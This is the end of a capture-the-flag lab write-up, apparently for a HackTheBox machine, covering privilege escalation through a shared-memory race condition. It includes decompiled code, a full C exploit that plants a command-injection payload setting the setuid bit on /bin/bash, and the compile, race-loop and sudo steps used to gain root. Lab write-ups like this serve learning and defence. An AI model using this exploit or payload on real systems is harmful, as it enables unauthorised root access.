                  pcVar4 = strdup((char *)(puVar10 + 4));
                  if (pcVar4 == (char *)0x0) {
                    puts("Failed to allocate memory for result string");
                    shmdt(__haystack);
                    bVar8 = false;
                  }
                  else {
                    pcVar6 = (char *)(puVar10 + 4);
                    cVar1 = *(char *)(((ulong)pcVar6 >> 3) + 0x7fff8000);
                    if (cVar1 <= (char)((byte)pcVar6 & 7) && cVar1 != '\0') {
                      __asan_report_load1(pcVar6);
                      pcVar6 = extraout_RDX;
                    }
                    if (*pcVar6 != '\0') {
                      printf("User will be notified via %s\n",puVar10 + 4);
                    }
                    free(pcVar4);
                    bVar8 = true;
                  }
                }
              }
            }
          }
          else {
            perror("setenv");
            shmdt(__haystack);
            bVar8 = false;
          }
          uVar7 = (ulong)(puVar10 + 4) >> 3;
          *(undefined4 *)(uVar7 + 0x7fff8000) = 0xf8f8f8f8;
          *(undefined4 *)(uVar7 + 0x7fff8004) = 0xf8f8f8f8;
          *(undefined4 *)(uVar7 + 0x7fff8008) = 0xf8f8f8f8;
          *(undefined4 *)(uVar7 + 0x7fff800c) = 0xf8f8f8f8;
          *(undefined4 *)(uVar7 + 0x7fff8010) = 0xf8f8f8f8;
          *(undefined4 *)(uVar7 + 0x7fff8014) = 0xf8f8f8f8;
          *(undefined4 *)(uVar7 + 0x7fff8018) = 0xf8f8f8f8;
          *(undefined4 *)(uVar7 + 0x7fff801c) = 0xf8f8f8f8;
          if (!bVar8) goto LAB_00103b3a;
        }
      }
      iVar2 = shmdt(__haystack);
      if (iVar2 == -1) {
        perror("shmdt");
      }
      unsetenv("MYSQL_PWD");
    }
  }
LAB_00103b3a:
  if (local_1a8 == puVar10) {
    *(undefined8 *)(uVar9 + 0x7fff8000) = 0;
    *(undefined8 *)(uVar9 + 0x7fff8008) = 0;
    *(undefined8 *)(uVar9 + 0x7fff8010) = 0;
    *(undefined8 *)(uVar9 + 0x7fff8018) = 0;
    *(undefined8 *)(uVar9 + 0x7fff8020) = 0;
    *(undefined4 *)(uVar9 + 0x7fff8028) = 0;
  }
  else {
    *puVar10 = 0x45e0360e;
    *(undefined8 *)(uVar9 + 0x7fff8000) = 0xf5f5f5f5f5f5f5f5;
    *(undefined8 *)(uVar9 + 0x7fff8008) = 0xf5f5f5f5f5f5f5f5;
    *(undefined8 *)(uVar9 + 0x7fff8010) = 0xf5f5f5f5f5f5f5f5;
    *(undefined8 *)(uVar9 + 0x7fff8018) = 0xf5f5f5f5f5f5f5f5;
    *(undefined8 *)(uVar9 + 0x7fff8020) = 0xf5f5f5f5f5f5f5f5;
    *(undefined4 *)(uVar9 + 0x7fff8028) = 0xf5f5f5f5;
    *(undefined1 *)puVar10[0x3f] = 0;
  }
  if (local_30 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

→ 

The `notify_user` function retrieves a leaked password hash from shared memory, queries a database (`teampass_users`) to find the associated email, and prints the email if found.

Key Points:

1. **Shared Memory Access**:
    - It attaches to a shared memory segment using `shmget(shm_key, 0666)`.
    - Searches for `"Leaked hash detected"` and extracts the hash after `>`.
2. **SQL Query Execution**:
    - It dynamically builds a MySQL command using `snprintf()`.
    - The query is executed via `popen()`, which is **unsafe**.

**Security Issue – Arbitrary Code Execution**:

- Since `trimmed_hash` is inserted **without sanitization**, an attacker could manipulate it to inject SQL or shell commands, leading to **command execution** on the system.

---

### `Exploit code :`

```c
#include <stdio.h>      
#include <stdlib.h>     // Standard library functions (e.g., exit, rand)
#include <sys/ipc.h>    // System V IPC key definitions
#include <sys/shm.h>    // Shared memory functions
#include <time.h>       // Time functions for random seeding
#include <errno.h>      // Error handling
#include <string.h>     // String handling functions

#define SHM_SIZE 0x400   // Define shared memory size (1024 bytes)
#define SHM_MODE 0x3B6   // Permissions: 0666 in octal

int main(void) {
    // Seed the random number generator using the current time.
    time_t current_time = time(NULL);
    srand((unsigned int)current_time);

    // Generate a random number and apply modulo to limit the key range.
    int random_value = rand();
    key_t key = random_value % 0xfffff; // Generate a key for shared memory

    // Print the generated key in hexadecimal format.
    printf("Generated key: 0x%X\n", key);

    // Create or get a shared memory segment with the generated key.
    int shmid = shmget(key, SHM_SIZE, IPC_CREAT | SHM_MODE);
    if (shmid == -1) {  // Check if shmget() failed
        perror("shmget");
        exit(EXIT_FAILURE);
    }

    // Attach to the shared memory segment and get a pointer to it.
    char *shmaddr = (char *)shmat(shmid, NULL, 0);
    if (shmaddr == (char *)-1) {  // Check if shmat() failed
        perror("shmat");
        exit(EXIT_FAILURE);
    }

    // Define the payload string to write into shared memory.
    const char *payload = "Leaked hash detected at Sat Feb 22 20:18:50 2025 > '; chmod +s /bin/bash;#";

    // Write the payload to the shared memory segment.
    snprintf(shmaddr, SHM_SIZE, "%s", payload);

    // Print the content that was written to shared memory.
    printf("Shared Memory Content:\n%s\n", shmaddr);

    // Detach from the shared memory segment.
    if (shmdt(shmaddr) == -1) {  // Check if shmdt() failed
        perror("shmdt");
        exit(EXIT_FAILURE);
    }

    return 0;
}
```

Now to perform the exploitation part this are the steps

make a .c file and compile it on that ssh shell

```bash
nano pain.c
```

```bash
gcc -o pain pain.c
```

To take advantage of the Race Condition, we repeatedly execute the exploit in a loop.

```bash
while true; do ./pain; done
```

![Screenshot 2025-02-26 at 5.33.16 PM.png](/assets/Images/HTB_Checker/Screenshot_2025-02-26_at_5.33.16_PM.png)

Finally, we can exploit the vulnerable binary by running the `check-leak.sh` script as a sudo user in a separate shell.

```bash
sudo /opt/hash-checker/check-leak.sh bob
```

![Screenshot 2025-02-26 at 5.33.44 PM.png](/assets/Images/HTB_Checker/Screenshot_2025-02-26_at_5.33.44_PM.png)

---

### Thanks For reading this whole Writeup ! i Hope you Like it